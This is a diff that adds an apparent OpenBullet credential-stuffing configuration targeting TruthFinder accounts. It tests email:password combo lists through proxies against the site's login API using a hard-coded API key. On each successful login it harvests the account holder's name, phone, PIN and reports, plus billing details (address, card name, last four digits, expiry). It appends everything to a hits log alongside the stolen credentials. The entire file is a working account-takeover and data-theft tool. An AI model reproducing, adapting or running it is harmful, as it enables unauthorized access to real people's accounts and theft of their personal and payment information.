@@ -1,0 +1,189 @@
+[SETTINGS]
+{
+  "Name": "𝑻𝑹𝑼𝑻𝑯𝑭𝑰𝑵𝑫𝑬𝑹 🔎",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-16T19:51:13.7277305-07:00",
+  "AdditionalInfo": "⚡️ US PROXY BEST ⚡️",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Guid FUNCTION GenerateGUID -> VAR "guid" 
+
+#Get REQUEST GET "https://www.truthfinder.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: image/webp,*/*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.truthfinder.com/login" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: last-known-device-id=<guid>" 
+
+#Session PARSE "<SOURCE>" LR "essionStorage.setItem('sessionId', \"" "\");" -> VAR "sessionid" 
+
+#Time FUNCTION CurrentUnixTime -> VAR "ctx" 
+
+#Length FUNCTION Length "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"sessionId\":\"<sessionid>\",\"sessionCreated\":\"<ctx>\"}" -> VAR "L" 
+
+#Login REQUEST POST "https://api2.truthfinder.com/v1/authenticate" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"sessionId\":\"<sessionid>\",\"sessionCreated\":\"<ctx>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.truthfinder.com/login" 
+  HEADER "api-key: B7QbTIt3PtAID67cRtfQwrgzL0H3qU5buaxp17PoZ98" 
+  HEADER "app-id: tf-web" 
+  HEADER "content-type: application/json" 
+  HEADER "device-id: <guid>" 
+  HEADER "Origin: https://www.truthfinder.com" 
+  HEADER "Content-Length: <L>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "TE: Trailers" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" EqualTo "Unauthorized" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" EqualTo "Locked" 
+  KEYCHAIN Success AND 
+    KEY "refreshToken" 
+    KEY "accessToken" 
+
+#Access PARSE "<SOURCE>" JSON "accessToken" -> VAR "access_token" 
+
+#Me REQUEST GET "https://api2.truthfinder.com/v1/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.truthfinder.com/dashboard" 
+  HEADER "api-key: B7QbTIt3PtAID67cRtfQwrgzL0H3qU5buaxp17PoZ98" 
+  HEADER "app-id: tf-web" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "device-id: <guid>" 
+  HEADER "Origin: https://www.truthfinder.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "TE: Trailers" 
+
+#Firstname PARSE "<SOURCE>" JSON "first_name" -> VAR "Firstname" 
+
+#Lastname PARSE "<SOURCE>" JSON "last_name" -> VAR "Lastname" 
+
+SET CAP "Fullname" "<Firstname> <Lastname>"
+
+#Phone PARSE "<SOURCE>" JSON "phone" -> VAR "Phone" 
+
+SET CAP "Phone" "+1 <Phone>"
+
+#Pin PARSE "<SOURCE>" JSON "pin" CreateEmpty=FALSE -> CAP "Pin" 
+
+#Report PARSE "<SOURCE>" JSON "premium_person_report" CreateEmpty=FALSE -> CAP "Premium" 
+
+#Report2 PARSE "<SOURCE>" JSON "phone_report" CreateEmpty=FALSE -> CAP "PhoneReport" 
+
+#Report3 PARSE "<SOURCE>" JSON "person_report" -> CAP "PersonReport" 
+
+#Report4 PARSE "<SOURCE>" JSON "location_report" -> CAP "LocationReport" 
+
+#Report5 PARSE "<SOURCE>" JSON "email_report" -> CAP "EmailReports" 
+
+#Check PARSE "<SOURCE>" JSON "status" -> VAR "status" 
+
+IF "<status>" EqualTo "active"
+
+#Payment REQUEST GET "https://api2.truthfinder.com/v1/me/payment-options" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.truthfinder.com/dashboard" 
+  HEADER "api-key: B7QbTIt3PtAID67cRtfQwrgzL0H3qU5buaxp17PoZ98" 
+  HEADER "app-id: tf-web" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "device-id: <guid>" 
+  HEADER "Origin: https://www.truthfinder.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "TE: Trailers" 
+
+#Method PARSE "<SOURCE>" JSON "name" -> CAP "Payment" 
+
+#PayerName PARSE "<SOURCE>" JSON "firstName" Recursive=TRUE -> VAR "PVname" 
+
+#PayerName2 PARSE "<SOURCE>" JSON "lastName" Recursive=TRUE -> VAR "PLname" 
+
+#Address PARSE "<SOURCE>" JSON "address1" Recursive=TRUE -> CAP "Address" 
+
+#State PARSE "<SOURCE>" JSON "state" Recursive=TRUE -> CAP "State" 
+
+#City PARSE "<SOURCE>" JSON "city" Recursive=TRUE -> CAP "City" 
+
+#Zip PARSE "<SOURCE>" JSON "zip" Recursive=TRUE -> CAP "Zip" 
+
+#CardName PARSE "<SOURCE>" JSON "name" Recursive=TRUE -> CAP "CardName" 
+
+#Last4 PARSE "<SOURCE>" JSON "last4" Recursive=TRUE -> CAP "Last4" 
+
+#Exp PARSE "<SOURCE>" JSON "exp_month" Recursive=TRUE -> VAR "Exp" 
+
+#Exp2 PARSE "<SOURCE>" JSON "exp_year" Recursive=TRUE -> VAR "Exp2" 
+
+#Card PARSE "<SOURCE>" JSON "card_network" Recursive=TRUE -> CAP "Card" 
+
+#Code PARSE "<SOURCE>" JSON "plus4_code" Recursive=TRUE -> CAP "Plus4Code" 
+
+SET CAP "Expire" "<Exp>/<Exp2>"
+SET CAP "PayerFullname" "<PVname> <PLname>"
+ENDIF
+
+#Hits UTILITY File "Truthfinder-Logs.txt" AppendLines "👑 ~ ~ ~ ~ < 💚 T R U T H F I N D E R 💚 > ~ ~ ~ ~ 👑\\n\\n⭐️ Combo : <USER>:<PASS>\\n\\n🏘 Fullname : <Fullname>\\n📞 Phone : <Phone>\\n📍 Pin : <Pin>\\n📃 Premium Report : <Premium>\\n📃 Phone Report : <PhoneReport>\\n📃 Person Report : <PersonReport>\\n📃 Location Report : <LocationReport>\\n📃 Email Report : <EmailReports>\\nℹ️ Status (Payment) : <status>\\n💲 Payment : <Payment>\\n💸 Payer Name : <PayerFullname>\\n🏘 Address : <Address>\\n🏘 City : <City>\\n🏘 Zip : <Zip>\\n💳 Card Name : <CardName>\\n💳 Last 4 CC Digit : <Last4>\\n📅 Expire Date : <Expire>\\n👩‍💻 CVV : <Plus4Code>\\n 🔒 Login : https://truthfinder.com/\\n⚡️ Config By F4c3r100 ⚡️\\n\\n👑 ~ ~ ~ ~ < 💚 C O N F I G 💚 > ~ ~ ~ ~ 👑\\n" -> VAR "Hits" 
+
